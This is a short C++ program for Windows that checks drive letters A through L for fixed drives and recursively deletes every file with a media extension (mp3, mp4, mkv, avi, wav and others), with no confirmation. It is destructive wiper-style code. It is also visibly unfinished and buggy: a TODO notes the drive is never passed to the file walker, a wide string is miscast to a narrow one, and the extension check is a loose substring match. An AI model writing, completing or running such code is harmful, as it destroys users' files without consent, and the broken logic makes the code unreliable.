#include <iostream>
#include <Windows.h>
#include <string>
#include <functional>
#include <dirent.h>
#include <cstdio>

using namespace std;

void listFiles(const string &path, function<void(const std::string &)> cb) {
    if (auto dir = opendir(path.c_str())) {
        while (auto f = readdir(dir)) {
            if (!f->d_name || f->d_name[0] == '.') continue;
            if (f->d_type == DT_DIR)
                listFiles(path + f->d_name + "/", cb);
            if (f->d_type == DT_REG)
                cb(path + f->d_name);
        }
        closedir(dir);
    }
}

LPCWSTR drive[13] = { L"A:\\", L"B:\\", L"C:\\", L"D:\\", L"E:\\", L"F:\\", L"G:\\", L"H:\\", L"I:\\", L"J:\\",  L"K:\\", L"L:\\" };


int main() {

    UINT drives_num;
    int i;
    for (i = 0; i < 12; i++) {
        drives_num = GetDriveType(reinterpret_cast<LPCSTR>(drive[i]));
        if (drives_num == DRIVE_FIXED) {
            // TODO: Pass Drive to listFiles func
            listFiles("", [](const string &path) {
                string ext, str;
                ext = path.substr(path.find_last_of('.')+1);
                str = "mp3 mp4 3gp mkv avi webm avi ogg wav";
                if (str.find(ext) != string::npos) {
                    // Delete File
                    const char* patth = path.c_str();
                    remove(patth);
                }
            });
        }
    }
    return 0;
}

